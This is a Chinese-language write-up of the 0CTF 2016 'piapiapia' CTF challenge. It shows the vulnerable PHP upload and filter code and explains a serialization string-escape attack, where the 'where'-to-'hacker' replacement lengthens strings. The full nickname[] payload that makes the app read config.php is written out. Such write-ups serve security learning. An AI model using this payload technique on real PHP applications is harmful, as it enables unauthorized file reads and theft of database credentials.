# [0CTF 2016]piapiapia
![](<./img/Pasted image 20221219085611.png>)

---
首页长这样

![](<./img/Pasted image 20221219085636.png>)

试密码和`sql`注入没试出来，八成是要扫目录

![](<./img/Pasted image 20221219105158.png>)

下载下来

![](<./img/Pasted image 20221219113827.png>)

访问`/register.php`进行一个账号的注册

![](<./img/Pasted image 20221219113932.png>)

来到`/profile.php`，然后又跳转到`/update.php`

![](<./img/Pasted image 20221219114033.png>)

有一个`upload`文件夹，`update.php`可以上传图片

---
`update.php`的关键代码
```php
$username = $_SESSION['username'];
if(!preg_match('/^\d{11}$/', $_POST['phone']))
	die('Invalid phone');

if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\.[_a-zA-Z0-9]{1,10}$/', $_POST['email']))
	die('Invalid email');

if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)
	die('Invalid nickname');

$file = $_FILES['photo'];
if($file['size'] < 5 or $file['size'] > 1000000)
	die('Photo size error');

move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));
$profile['phone'] = $_POST['phone'];
$profile['email'] = $_POST['email'];
$profile['nickname'] = $_POST['nickname'];
$profile['photo'] = 'upload/' . md5($file['name']);

$user->update_profile($username, serialize($profile));
echo 'Update Profile Success!<a href="profile.php">Your Profile</a>';
```
最后向`$user->update_profile`传递了经过序列化的`$profile`

`update_profile`在`class.php`中
```php
public function update_profile($username, $new_profile) {
	$username = parent::filter($username);
	$new_profile = parent::filter($new_profile);

	$where = "username = '$username'";
	return parent::update($this->table, 'profile', $new_profile, $where);
}
```
调用了`parent::filter`
```php
public function filter($string) {
	$escape = array('\'', '\\\\');
	$escape = '/' . implode('|', $escape) . '/';
	$string = preg_replace($escape, '_', $string);

	$safe = array('select', 'insert', 'update', 'delete', 'where');
	$safe = '/' . implode('|', $safe) . '/i';
	return preg_replace($safe, 'hacker', $string);
}
```
对序列化结果进行过滤（大喜

八成是字符串逃逸了

利用`nickname`制造逃逸，通过传递数组绕过`preg_match`

`where`是5个字符，`hacker`是6个字符，利用对`where`的过滤把`nickname`中的非法字符顶出去

目标是读取`config.php`
```php
<?php
	$config['hostname'] = '127.0.0.1';
	$config['username'] = 'root';
	$config['password'] = '';
	$config['database'] = '';
	$flag = '';
?>
```

构造`payload`
```php
<?php
	$profile['phone'] = '18888888888';
	$profile['email'] = 'somebody@host.com';
	$profile['nickname'] = array('nickname');
	$profile['photo'] = 'upload/sdfia';
	echo serialize($profile);
?>
```

> a:4:{s:5:"phone";s:11:"18888888888";s:5:"email";s:17:"somebody@host.com";s:8:"nickname";a:1:{i:0;s:8:"nickname";}s:5:"photo";s:12:"upload/sdfia";}

我们需要逃逸的内容
```
";}s:5:"photo";s:10:"config.php";}
```
长度为34

于是`payload`为
```
nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}
```

![](<./img/Pasted image 20221219184827.png>)

![](<./img/Pasted image 20221219184912.png>)

![](<./img/Pasted image 20221219184953.png>)

![](<./img/Pasted image 20221219185026.png>)

![](<./img/Pasted image 20221219185118.png>)
